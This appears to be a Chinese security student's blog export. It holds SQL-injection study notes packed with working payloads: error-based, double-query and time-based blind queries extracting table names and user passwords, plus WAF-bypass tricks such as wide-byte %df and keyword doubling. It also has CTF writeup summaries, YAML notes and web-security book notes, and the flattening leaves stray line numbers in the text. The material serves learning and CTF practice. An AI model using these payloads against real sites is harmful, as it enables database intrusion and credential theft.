--+&amp;submit=Submit也可以用：uname=admin&amp;passwd=11&apos; and updatexml(1,concat(0x7e,(select password from (select password from users limit 7,1) test ),0x7e),1) --+&amp;submit=Submit### 双查询注入,适用于只报错误语句的情况,有概率 基于聚合分组函数的双注入 下面是payload: 1、爆库名: ?id=1’ union select 1,count(),concat((select database()),floor(rand()2)) as a from information_schema.columns group by a%23 2、爆表名： ?id=1’ union select 1,count(),concat((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),floor(rand()2)) as a from information_schema.columns group by a%23 将从limit 0,1依次变到limit 3,1即可爆出所有的表 3、爆列名： ?id=1’ union select 1,count(),concat((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 0,1),floor(rand()2)) as a from information_schema.columns group by a%23 4、爆内容：?id=1’ union select 1,count(),concat((select username from security.users limit 0,1),floor(rand()2)) as a from information_schema.tables group by a%23 123456789101112131415161718参考资料- https://www.cnblogs.com/huangming-zzz/p/9878773.html- https://www.2cto.com/article/201303/192718.html# 无回显## bool盲注&gt; 验证?id=1&apos; and 1=1--+ //正确?id=1&apos; and 1=2--+ //失败## 时间盲注payload uname=admin’ and if(length(database())=8,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit uname=admin’ and if(left(database(),1)=’s’,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit uname=admin’ and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=’r’ ,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit uname=admin’ and if(left((select column_name from information_schema.columns where table_name=’users’ limit 4,1),8)=’password’ ,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submituname=admin’ and if(left((select password from users order by id limit 0,1),4)=’dumb’ ,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit uname=admin’ and if(left((select username from users order by id limit 0,1),4)=’dumb’ ,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit12345678910# 二次注入注册admin&apos;# .改密码就会修改admin的密码# 各种绕过姿势(转)## 1.绕过空格（注释符/* */，%a0）： `两个空格代替一个空格，用Tab代替空格，%a0=空格：` %20 %09 %0a %0b %0c %0d %a0 %00 /*/ /!*/12最基本的绕过方法，用注释替换空格： / 注释 /1234![img](../../images/sql注入/1206476-20170728221518555-1717045547.png)使用浮点数： select from users where id=8E0union select 1,2,3select from users where id=8.0 select 1,2,312345678## 2.括号绕过空格： 如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。例如： select(user())from dual where(1=1)and(2=2)12 这种过滤方法常常用于time based盲注,例如： ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%2312345678（from for属于逗号绕过下面会有） 上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。## 3.引号绕过（**使用十六进制**）： 会使用到引号的地方一般是在最后的`where`子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句： select column_name from information_schema.tables where table_name=”users”123 这个时候如果引号被过滤了，那么上面的`where`子句就无法使用了。那么遇到这样的问题就要使用**十六进制**来处理这个问题了。` users`的十六进制的字符串是`7573657273`。那么最后的sql语句就变为了： select column_name from information_schema.tables where table_name=0x75736572731234## 4.逗号绕过（**使用from或者offset**）： 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用`from to`的方式来解决： select substr(database() from 1 for 1);select mid(database() from 1 for 1);12使用join： union select 1,2 #等价于union select * from (select 1)a join (select 2)b1234 使用like： select ascii(mid(user(),1,1))=80 #等价于select user() like ‘r%’1234 对于`limit`可以使用`offset`来绕过： select * from news limit 0,1 等价于下面这条SQL语句select * from news limit 1 offset 0123456789## 5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：### 使用greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到`greatest`来进行绕过了。 最常见的一个盲注的sql语句： select * from users where id=1 and ascii(substr(database(),0,1))&gt;64123 此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用`greatest`来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。 那么上面的这条sql语句可以使用`greatest`变为如下的子句: select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64123456### 使用between and： between a and b：返回a，b之间的数据，不包含b。## 6.or and xor not绕过： and=&amp;&amp; or=|| xor=| not=!12## 7.绕过注释符号（#，--(后面跟一个空格））过滤： id=1’ union select 1,2,3||’112 最后的or &apos;1闭合查询语句的最后的单引号，或者： id=1’ union select 1,2,’312345678910## 8.=绕过： 使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;## 9.绕过union，select，where等：### （1）使用注释符绕过： 常用注释符： //，– , /**/, #, –+, – -, ;,%00,–a12 用法： U// NION // SE// LECT //user，pwd from user12### （2）使用大小写绕过： id=-1’UnIoN/**/SeLeCT12### （3）内联注释绕过： id=-1’/!UnIoN/ SeLeCT 1,2,concat(/!table_name/) FrOM /information_schema/.tables /!WHERE //!TaBlE_ScHeMa/ like database()#12### （4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）： id=-1’UNIunionONSeLselectECT1,2,3–-1234## 10.通用绕过（编码）： 如URLEncode编码，ASCII,HEX,unicode编码绕过： or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。1234## 11.等价函数绕过：[![复制代码](../../images/sql注入/copycode.gif)](javascript:void(0);) hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select ‘password’),1,1) = 0x70strcmp(left(‘password’,1), 0x69) = 1strcmp(left(‘password’,1), 0x70) = 0strcmp(left(‘password’,1), 0x71) = -112345678910[![复制代码](../../images/sql注入/copycode.gif)](javascript:void(0);)## 12.宽字节注入： 过滤 &apos; 的时候往往利用的思路是将 &apos; 转换为 \&apos; 。 在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路： （1）%df 吃掉 \ 具体的方法是 urlencode(&apos;\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，he而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（&apos;）符号在外面： id=-1%df%27union select 1,user(),3–+123456789101112 （2）将 \&apos; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。### 一般产生宽字节注入的PHP函数： 1.replace（）：过滤 &apos; \ ，将 &apos; 转化为 \&apos; ，将 \ 转为 \\，将 &quot; 转为 \&quot; 。用思路一。 2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：&apos; , &quot; , \ 。用思路一（防御此漏洞，要将 mysql_query 设置为 binary 的方式） 3.mysql_real_escape_string()：转义下列字符： \x00 \n \r \ ‘ “ \x1a` （防御，将mysql设置为gbk即可） 来自: https://www.cnblogs.com/Vinson404/p/7253255.html waf https://www.cnblogs.com/lcamry/p/5762961.html]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>学习笔记</tag>
        <tag>ctf</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网安比赛程序逻辑]]></title>
    <url>%2Fold_post%2F%E7%BD%91%E5%AE%89%E6%AF%94%E8%B5%9B%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>杂乱</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugctf综合题目整理]]></title>
    <url>%2Fold_post%2Fctf%2F%E5%8D%97%E9%82%AEctf%E9%87%8D%E5%81%9A%20(copy).html</url>
    <content type="text"><![CDATA[把综合的题目归纳整理一下,整理思路和方法. 江湖魔头属性是加密存在cookie里的,js里面有解密脚本,自己构造属性后提交,注意不能直接构造字符串,要写在文件,读取,然后编码,可能是因为二进制的问题??然后可以拿到flag,我的代码基础还是太弱了 login4cbc字节翻转攻击 cbc加密模式分组加密,iv加密第一组,第一组密文加密第二组以此类推 然后可以通过修改n-1组的密文,修改解密后n组的值,由于cookie可以控制初始化向量iv,因此可以修改任意值 通过admiN登录,然后把N改成n ##]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>南邮ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮bugctf重做]]></title>
    <url>%2Fold_post%2Fctf%2F%E5%8D%97%E9%82%AEctf%E9%87%8D%E5%81%9A.html</url>
    <content type="text"><![CDATA[根据学长的指引，尽量不看别人的writeup，把南邮，bugctf重做一遍,然后把题目归纳整理一下 综合题目(其实是不知道怎么分类)1. 签到题看源码 2.MD5 collisionmd5碰撞，md5(‘QNKCDZO’) 加密出来0e 开头，比较又是==，弱类型比较，会转化成数字0，因此相等 弱类型比较，php会在字符和数组比较时，把字符转成数字，例子 ‘1admin’ 转成 1，’admin1’ 转成 0 特别的，如果字符串中有e，E,则会按照科学记数法解释 附录:php类型比较表 3.签到题2html限制了输入长度,直接改掉就行 4.这题不是web杂项吧,看图片源码,base64解码,拿到flag 5. 层层递进进了几个页面,最后 得到flag 不太懂这道题的考点,分析所有网页源码? AAencodejavascript利用颜文字加密,解码或者直接运行就行 开始因为谷歌浏览器自动编码被坑了半天,应该是原unicode编码 aaencode是js加密的一种特别好玩，可以吧文字加密成表情除了aaencode之外还有几种特别的加密方式 Perl的ppencodeRuby的rrencode 编码连接如下：http://www.cnblogs.com/android-html5/archive/2011/02/09/2533784.html 在这里推荐一下这个网站： http://ctf.ssleye.com/ 本题用的是这个网站下面的一个解密算法： http://ctf.ssleye.com/aaencode.html 这里有console的好玩用法：http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html 单身20年网页中间会有一个跳转,看google调试控制台,或者burp 历史记录 单身100年也没有用跟上面一样 MYSQL根据提示,看robots文件,然后构造1024.1就行 伪装者XFF头? 没成功, Headerheader头直接看到flag 综合题jsfuck,终端跑一下,得到php地址,提示在脑袋里里,看header头,,bash_history 访问之,提示一个zip文件，下载就好了 综合题二本CMS 存在文件包含,读源码,记得about本身,然后发现loginxlcteam目录,是后台,so.php 那里有一个注入,过滤可以双写绕过,拿到密码登录,提示有一句话木马 利用php 回调函数实现的不太懂,登深入学php在研究吧,然后利用一句话看当前目录拿到flag, php回调函数实现后门 密码重置2根据提示submit.php 读异常退出文件,token传0e12345678 拿到flag 网站被黑扫目录,得到shel地址,爆破 login2(SKCTF)利用union构建密码登录,反弹shell,拿到flag login3(SKCTF)bool盲注有时间研究吧 php安全bypass again弱类型比较,没意思 传数组,或者0e碰撞 变量覆盖把post数组的变量引入全局,存在覆盖原变量问题 PHP是世界上最好的语言url双重编码绕过 pass check传数组 起名字真难16进制绕过字符检查 /x0000截断,或者传入数组没什么 php 反序列化php 反序列化 变量覆盖变量覆盖,get覆盖掉就行 服务端安全注入攻击SQL注入1看源码主要闭合用了’) GBK Injection宽字节注入.没什么 SQL Injection大概思路用\闭合是username 的单引号失效,然后password 的变量就可控制了 SQL注入2构造sql语句 sql Injection看源码 用了htimhtmlentities($str, ENT_QUOTES) 没有过滤/,利用/闭合单引号, 传入是username=\&amp;password=or 1=1%23 这样子 sql语句就变成了 SELECT * FROM users WHERE name=’\‘ AND pass=’ or 1= 1#’; SQL注入2提示了联合查询,union 自己构造一个pw=1传入就行 文件上传绕过可以控制的是dir和filename dir处改1.php后面00截断 文件包含include 直接包含文件,利用php 伪协议直接读各种源码 file_get_contentsPhp伪协议,input donwlload~!服务器进不去了,看了writeup 下载链接里的文件base64 编码,按照编码下载download.php就行 权限与认证密码重置url参数base64转码,伪造admin ###COOKIE 改cookie就行,cookie和session不一样,想起来以前django伪造session的题目,难题也是简单题目演变出来的]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>南邮ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS读书笔记]]></title>
    <url>%2Fold_post%2FXSS%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>ctf</tag>
        <tag>xss</tag>
        <tag>html</tag>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[YAML语法笔记]]></title>
    <url>%2Fold_post%2FYAML%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"><![CDATA[笔记 基本规则语法 大小写敏感 文档使用unicede 编码，utf-8 使用缩进表示层级关系，只允许使用空格，不允许缩进 同层级元素左对齐，空格数目不重要 #注释 数据结构序列（相当于列表）123456 - 灰蓝 - 蓝 - 黑或者[灰蓝，蓝] 键值表（字典）123456name: 惠兰age: 0或者&#123;name:惠兰,age:0&#125; “? “ 问号+空格表示复杂的键。当键是一个列表或键值表时，就需要使用本符号来标记。 1234567# 使用一个列表作为键? [blue, reg, green]: Color # 等价于 ? - blue - reg - gree : Color 基本类型 字符串 整数 浮点型 布尔型 null 时间 日期123456789# test.yaml#这个例子输出一个字典，其中value包括所有基本类型str: &quot;Hello World!&quot;int: 110float: 3.141boolean: true # or falseNone: null # 也可以用 ~ 号来表示 nulltime: 2016-09-22t11:43:30.20+08:00 # ISO8601，写法百度date: 2016-09-22 # 同样ISO8601 输出： 1&#123;&apos;date&apos;: datetime.date(2016, 9, 22), &apos;None&apos;: None, &apos;boolean&apos;: True, &apos;str&apos;: &apos;Hello World!&apos;, &apos;time&apos;: datetime.datetime(2016, 9, 22, 3, 43, 30, 200000), &apos;int&apos;: 110, &apos;float&apos;: 3.141&#125; 1234567891011121314151617integer: 12345 # 整数标准形式octal: 0o34 # 八进制表示，第二个是字母 ohex: 0xFF # 十六进制表示float: 1.23e+3 # 浮点数fixed: 13.67 # 固定小数minmin: -.inf # 表示负无穷notNumber: .NaN # 无效数字null: # 空值boolean: [true, false] # 布尔值string: ‘12345‘ # 字符串date: 2015-08-23 # 日期datetime: 2015-08-23T02:02:00.1z # 日期时间iso8601: 2015-08-23t21:59:43.10-05:00 # iso8601 日期格式spaced: 2015-08-23 21:59:43.10 -5 # ? “!”（叹号）显式指示类型，或自定义类型标识。单叹号通常是自定义类型，双叹号是内置类型123456789101112131415161718192021222324252627282930313233343536373839404142isString: !!str 2015-08-23 # 强调是字符串不是日期数据picture: !!binary | # Base64 图片 R0lGODlhDAAMAIQAAP//9/X 17unp5WZmZgAAAOfn515eXv Pz7Y6OjuDg4J+fn5OTk6enp 56enmleECcgggoBADs=#下面是内置类型!!int # 整数类型!!float # 浮点类型!!bool # 布尔类型!!str # 字符串类型!!binary # 也是字符串类型!!timestamp # 日期时间类型!!null # 空值!!set # 集合!!omap, !!pairs # 键值列表或对象列表!!seq # 序列，也是列表!!map # 键值表#下面是一些例子：--- !!omap- Mark: 65- Sammy: 63- Key: 58--- !!set # 注意，“?”表示键为列表，在这里列表为 null? Mark? Sammy? Key# 下面是自定义的类型或标识%TAG ! tag:clarkevans.com,2002: # % 是指令符号--- !shape# Use the ! handle for presenting# tag:clarkevans.com,2002:circle- !circle center: &amp;ORIGIN &#123;x: 73, y: 129&#125; radius: 7- !line start: *ORIGIN finish: &#123; x: 89, y: 102 &#125;- !label start: *ORIGIN color: 0xFFEEBB text: Pretty vector drawing 字符串 如果字符串没有空格或特殊字符，不需要加引号，但如果其中有空格或特殊字符，则需要加引号了 双引号中的特殊字符会被python解释，单引号不会 单引号里面的还有单引号需要，里面的需要写两个单引号 字符串可以写多行，从第二行开始必须有一个单空格缩进，每行字符解释后会变成空格，即换行符被转成空格，要保留换行符，需要使用”|‘,注意前面要加一个空格 |可以保留换行符，&gt;可以折叠换行符，这个符号好像没什么用，跟直接写多行一样 表示保留文字块末尾的换行，-表示删除字符串末尾的换行。 123yaml: |+ # 注意 &quot;:&quot; 与 &quot;|&quot; 之间的空格 JSON的语法其实是YAML的子集，大部分的JSON文件都可以被YAML的解释器解释。 如果你想更深入的学习YAML，我建议你去 http://www.yaml.org 看看 表示保留文字块末尾的换行，-表示删除字符串末尾的换行 引用锚点&amp;和别名*，可以用来引用。 1234567891011121314&gt; &gt; defaults: &amp;defaults&gt; adapter: postgres&gt; host: localhost&gt; &gt; development:&gt; database: myapp_development&gt; &lt;&lt;: *defaults&gt; &gt; test:&gt; database: myapp_test&gt; &lt;&lt;: *defaults&gt; &gt; 等同于下面的代码。 12345678910111213141516&gt; &gt; defaults:&gt; adapter: postgres&gt; host: localhost&gt; &gt; development:&gt; database: myapp_development&gt; adapter: postgres&gt; host: localhost&gt; &gt; test:&gt; database: myapp_test&gt; adapter: postgres&gt; host: localhost&gt; &gt; &amp;用来建立锚点（defaults），&lt;&lt;表示合并到当前数据，*用来引用锚点。 下面是另一个例子。 12345678&gt; &gt; - &amp;showell Steve &gt; - Clark &gt; - Brian &gt; - Oren &gt; - *showell &gt; &gt; 转为 JavaScript 代码如下。 123&gt; &gt; [ &apos;Steve&apos;, &apos;Clark&apos;, &apos;Brian&apos;, &apos;Oren&apos;, &apos;Steve&apos; ]&gt; 在python中的使用PyYaml是Python的一个专门针对yaml文件操作的模块，使用起来非常简单。 安装： 1pip install PyYaml 或者到这里下载相应版本的包，人工安装，http://pyyaml.org/wiki/PyYAML 点击打开链接。 使用： 使用起来非常简单，就像json、pickle一样，load、dump就足够我们使用了。 load() 1234import yaml yaml_str = &quot;&quot;&quot;name: 灰蓝age: 0job: Tester&quot;&quot;&quot; y = yaml.load(yaml_str)print y 结果：{‘job’: ‘Tester’, ‘age’: 0, ‘name’: u’\u7070\u84dd’} dump() 1234import yaml python_obj = &#123;&quot;name&quot;: u&quot;灰蓝&quot;,&quot;age&quot;: 0,&quot;job&quot;: &quot;Tester&quot; &#125; y = yaml.dump(python_obj,default_flow_style=False)print y 输出结果： 123age: 0job: Testername: &quot;\u7070\u84DD&quot; 上面只是简单的两个应用，还有 load_all()、dump_all() 等，我们一般用这四个足够了，另外两个下面会讲到，其他方法可以自己看API，我也没怎么折腾过 -]]></content>
      <categories>
        <category>杂乱</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>程序设计比赛</tag>
        <tag>yaml</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网安程序设计比赛文档]]></title>
    <url>%2Fold_post%2F%E7%BD%91%E5%AE%89%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%AF%94%E8%B5%9B%E6%96%87%E6%A1%A3.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>杂乱</category>
      </categories>
      <tags>
        <tag>网安程序设计比赛文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[白帽子讲web安全笔记]]></title>
    <url>%2Fold_post%2F%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"><![CDATA[笔记 安全世界观web安全简史 web安全的兴起 动态脚本安全问题 sql，xss，csrf出现 web攻击从服务端转向客户端 新型脚本语言，html5，新的变化 安全的本质 信任问题 安全是一个持续的过程安全三要素 机密性 完整性 数据内容完整没有别篡改 数字签名 可用性 随需而得 白帽子兵法Secure By Default 原则- 白名单黑名单 - 最小权限原则 - 纵深防御原则（Secure by default） - 将风险分散到系统的个个层面 - 在正确的地方做正确的事 - 数据与代码分离原则 - 不可预测性原则 附录（谁来为漏洞买单）- 很多问题只是功能，不是漏洞 浏览器安全同源策略 当javaScript被认为来自不同源时，请求会被拒绝 影响源的因素host（域名或ip，ip会被认为为根域名），子域名，端口，协议 浏览器看的是加载JavaScript文件的页面所在域 &lt;img&gt;&lt;script&gt;&lt;iframe&gt;&lt;link&gt;等标签可以跨域加载资源，其实是带“src”属性的标签，这些资源JavaScript不能读写 通过目标域http头 access-control-allow-origin 来判断是否可以跨域 第三方插件也会受同源策略的限制，如flash，Java applet flash 会 通过目标网站的crossdomain.xml文件判断 flash 9 以后，mime检查，根目录检查 ie 8 css跨域漏洞 fontFamily 后面的内容被当作了value，从而可以被读 浏览器沙箱 多进程，行为分离 恶意网站拦截 黑名单 挂马 钓鱼 evssl证书 高速发展的浏览器安全 浏览器的xss fifter 功能 csp 内容安全策略 畸形url处理的安全隐患 浏览器插件的安全问题 xss基本介绍 反射型xss 储存型 DOM Based XSS 攻击进阶 盗取cookie 伪造get或post请求 可能的问题 提交表单需要验证码 获取到验证码，发送到远端服务器，返回解码后内容 修改密码，需要old password 画一个登录框，输入密码后，发送的黑客服务器上 识别用户浏览器 useragent 对象 os版本，浏览器版本，系统语言 利用浏览器实现的差异 识别用户安装的软件 ie 可以通过判断ActiveX 控件的classid 是否存在，推断安装的软件 css History hack 利用浏览过的a的样式不同，获取用户的浏览历史，firefox 在2010.3决定修复这个问题 获取本地ip地址 安装了java环境，java applet 的接口 攻击平台xss Worm调试javaScriptfirebug xss构造技巧利用字符编码类似sql里的宽字节注入 返回页面时GBK/GB2312 编码，%c1\ 会变成一个unicode 字符，在fireofx会认为是一个字符 绕过长度限制 利用事件缩短代码长度 利用location.hash 藏代码，并且url中#后面的内容不会发送 如果有多个文本框可以利用注释，或者构造变量 利用base标签，它可以插入任何位置，可以劫持标签后所有使用相对路径的标签 利用window.name 的妙用 当前窗口的名字，不受同源策略的限制 黑客可以先利用a.com设置好window.name 然后跳转b.com b.com可以直接eval(name) apache 1.3.34，2.0.57，2.2.1及以下 服务器出错时，如果请求有Expect 头，会将内容直接返回，形成xss漏洞 可以利用flash构造expect头，以修补 java appletanehta 的回旋镖 将反射型xss像存储型一样使用 在a域，嵌入反射型的b域，即可将反射型xss像存储型一样使用 ie 对&lt;iframe&gt;&lt;img&gt;&lt;link&gt;等标签会拦截cookie的发送，故要利用form 表单，跳转到b，在跳回来，缺点，url地址会变化flash xss flash中可以嵌入actionscript 脚本，甚至发起网络连接 javascript 开发框架可能的DOM Based XSS 问题 xss 的防御httponly给cookie设置这个值，阻止JavaScript读cookie 输入检查 同时在客户端服务端检查 全局型xss filter，没有输出的全文语境，容易漏报 可能改变用户输入的语义 如果在输入的地方统一对数据做了改变，在不同代码输出时，可能显示不同 输出检查安全编码函数只需要一种编码吗？ 注意变量的输出语境， 正确的防御xss根据不同的场景，一一解决 html 标签中输出 htmlencode html 属性中输出 htmlencode 在&lt;script&gt; 中输出 确保变量在引号中 同时使用javascriptencode 在事件中输出 使用javascriptencode 在css中输出 在地址中输出 url编码 如果是整个地址 不能直接url编码，可以改变意义 javascript 伪协议 dataurl 伪协议 mozilla 支持 先检查开头是不是http，在url编码富文本处理 尽量使用白名单 标签 css 开源过滤项目 防御DOM Based XSS输出到&lt;script&gt;需要转义，从&lt;script&gt;输出到html也要转义 csrf初探攻击者在自己的域构造一个页面，利用img标签发送get请求，诱导管理员访问b域执行请求 进阶浏览器的cookie 策略 session 在内存中，管理tab不会失效，关闭浏览器则失效 Third-party Cookie 在本地，随设置的失效时间失效 P3P头的副作用 p3p头 用于跨域设置cookie，内嵌的广告页面需要 问题，设置后ie会不在拦截iframe 等标签的cookie发送 其他 flash post 请求 可能使用request接受，直接get 利用表达构造，，javascript 自动提交 csrf 蠕虫 csrf防御初步 验证码 referer check anti csrf token 加上攻击者猜不到的参数 哈希加盐加密 新增一个随机参数token 表单增加一个 在cookie或session存储一个 token 使用原则 要足够随机，不能被预测到，真随机数发生器 消耗掉需要换一个 如果存在coookie，多页面提交可能会有文件，解决方法同时生成多个 token 尽量不要放在url中，否则如果被攻击页面包含了攻击者可以指定地址的图片，可能会通过referer 泄露 应尽量放在表达中，以post 或ajax提交 被攻击站网站如果存在xss漏洞，token会失效，称之为xsrf 和 csrf 以示区分 点击劫持是什么 构造一个不可见的iframe 页面，诱导用户在这个界面操作 常见攻击 falsh点击劫持 图片覆盖攻击 XISO 攻击 通过控制图片的style改变图片位置，诱使用户点击 拖拽劫持与数据窃取 浏览器开始支持Drag&amp;Drop API ，用户可以从一个窗口拖到另一个窗口，不受同源策略限制， 诱使用户从不可间的iframe 拖拽数据到攻击者可以控制的另一个页面 触屏劫持 通过一个不可见的iframe 劫持用户的触屏操作防御 clickJacking 禁止frame frame busting 利用javascript 禁止frame嵌套 可能被多层嵌套绕过 html5 的dandbox 属性，ie iframe的security 属性可以禁止iframe 的javaScript 脚本执行，使frame busting 失效 X-Frame-Options 值为DENY 时，浏览器会拒绝加载frame页面 值为SAMEORIFIN ，只允许同源 ALLOW-FROM 则可以定义允许加载的地址 firefos 的csp 和noscript扩展也能有效的防御Clickjacking html5 安全新的标签 xss绕过问题 ifame 的sandbox属性 &lt;iframe&gt;会被看作一个独立的源，可以利用sandbox实现更精准的控制 &lt;a&gt;和&lt;area&gt; 定义了一个新的rel(Link typees) ： noreferrer , 加上此标签则不会发生refererm cancas 不同于加载一个图片，而是画布 甚至可以利用它破解验证码 其他安全问题 cross-origin resource sharing a 跨域访问b，a的请求带origin 参数，b 中access-control-allow-origin 会写允不允许跨域 postMessage 允许像window（当前，弹出，iframes等） 发送消息 web storage session storage 浏览器关闭即消失 local storage sql 注入攻击初探 普通攻击 报错注入 盲注 攻击技巧 获取数据 命令执行 自定义函数 udf 储存过程的攻击 xp_cmdshell 存储过程本身的注入漏洞 编码问题 宽字节注入，统一字符集 sql column truncation sql约束攻击 超长值可能会截断，导致越权admin+50空格+a-防御 初步 过滤，可能被绕过 使用预编译语句 使用存储过程 检查数据类型 使用安全函数 其他注入攻击 xml注入 同html注入，因为没有过滤，直接拼接字符串 XML外部实体注入（XXE） 如果xml文档被加载，则可能存在这个漏洞，可以任意读文件 代码注入 eval() 拼接 CRLF 注入 CR 表示\r LF表示\n ，其十六进制编码为0x0d，0x0a， CRLF 常用于不同语义的换行符，通过注入CRLF字符则可能改变原理的语义 通过CRLF可能构造一条新的日志 注入HTTP头 用户提交的数据出现在cookie等地方，可以构造两次换行，结束http头，然后在html中插入xss 只换行一次，可以构造返回头， 文件上传漏洞初探 上传检查 黑名单绕过 %00截断 文件头检查 图片中插入php代码 apache 1.x，2.x文件解析问题 iis6文件解析问题 遇到；会截断 php CGI 路径解析问题 php cgi.fix_pathinfo选项默认开启 映射URL 两个环境变量，PATH_INFO,SCRIPT_FILENAME ,映射url时，将递归查询路径确定文件，最后一个不存在则向前递归， 利用文件上传钓鱼 302跳转url路径会改变 上传图片，加入html代码, 设计安全的文件上传功能 上传目录设置为不可执行 判断文件类型 白名单 对图片使用压缩函数，破坏可能包含的html代码 利用随机数改写文件名和路径 单独设置文件服务器域名，利用同源策略，使crossdomain.xml，xss利用失效 认证与会话管理初探 认证解决的 who am I 的问题 认证实际上是一个验证凭证的过程， 单因素验证 多因素验证 密码 复杂度，不要使用用户公开数据，或个人隐私相关数据， 服务器存储 不可逆加密算法，或单向散列函数算法 MD5，彩虹表破解，，加盐 多因素认证 session 与认证 sessionID 储存在cookie中，标识用户信息 一旦在生命周期被窃取，相当于账户失窃 cookie 可能被窃取 早期手机操作系统不支持cookie，sessionid 保存在url中，有很多问题 外部图片的引用，referer 头泄露sid session fixation 攻击 a把网页给b，b登录后session 为改变，则a也可能会登录b的账户 解决登陆后重写sessionid session 保持攻击 session有生命周期 一直活动时session保持下去 网站访问量过大，sesson 可能交给浏览器维护，服务器只解密cookie，很多应用利用cookie 的expire标签控制session 失效时间 利用javascript 在xss攻击后将cookie 设置为永不过期 对抗 一段时间后，强制销毁session 当用户ip，useragent 改变后，强制销毁 用户可以同时拥有几个session 单点登录（sso） openID 访问控制初探 What Can I Do? - 网络，利用路由设备或防火墙基于ip的访问控制 - 操作系统 - web应用 - 基于url的访问控制 - 授权用户可以访问的url![](/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416123655354.png) - - 基于方法的访问控制 - 基于数据的访问控制 垂直权限管理 基于角色的访问控制RBAC 用户属于不同的角色，不同的角色有不同的权限-可能的问题，水平越权 水平权限管理 基于数据的访问控制 使用用户组的概念， 实现一个规则引擎， OAuth 议 加密算法与随机数加密算法初探简介 分组加密 流密码加密 问题 stream cipher attack 使用同一个密钥多次加密 reused key attack 四个数据只要知道3个，就可以推到另一个，密钥C失效 增加一个初始化向量IV，使每次加密密钥不同。IV可以随意传播 bit-flipping attack 当攻击者获取了普通用户a，acookie就可能伪造管理员的cookie 解决方法 附带mac，利用哈希函数加密，hmac，解密密文和mac比较，防止密文被篡改 弱随机IV 问题 但若IV不够随机，暴力破解，可以出现相同的IV，仍然可以实施攻击 wep 的破解 IV 重复的问题 ECB 模式的缺陷 分组加密的通用加密模式ECB， 分组互不关联，改变分组的密文顺序，明文顺序同样改变 padding oracle attack 看不懂，待填坑 密钥管理 密码系统的安全性应该依赖与密钥的复杂性，而不应该依赖算法的报名性 密钥管理的常见错误，就是将密钥硬编码在代码里 可能因为代码的广泛传播而泄露 软件开发团队都可能看到代码 解决 对于web应用，通常将密钥（包括密码）保存在配置文件或者数据库里 伪随机数问题初探 随机因子不够大，被遍历 